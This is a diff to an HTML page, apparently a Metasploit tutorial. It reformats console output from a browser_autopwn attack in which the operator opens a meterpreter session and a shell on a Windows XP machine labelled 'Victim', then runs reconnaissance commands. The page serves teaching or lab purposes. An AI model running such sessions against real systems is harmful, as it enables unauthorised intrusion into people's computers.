@@ -28,7 +28,8 @@ This will trigger the browser_autopwn module to serve the appropriate exploit an
 <font color="silver">msf auxiliary(browser_autopwn) ></font><b> sessions -i 1</b><br>
 <font color="silver">[*] Starting interaction with 1...meterpreter ></font><b> shell</b><br>
 <font color="silver">Microsoft Windows XP [Version 5.1.2600]</font><br>
-<font color="silver">(C) Copyright 1985-2001 Microsoft Corp.C:\Documents and Settings\IEUser\Desktop></font><b>echo %USERNAME%</b><br>
+<font color="silver">(C) Copyright 1985-2001 Microsoft Corp.</font><br>
+<font color="silver">C:\Documents and Settings\IEUser\Desktop></font><b>echo %USERNAME%</b><br>
 <font color="silver">Victim</font><br>
 <br>
 <font color="silver">C:\Documents and Settings\IEUser\Desktop></font><b>ipconfig</b><br>
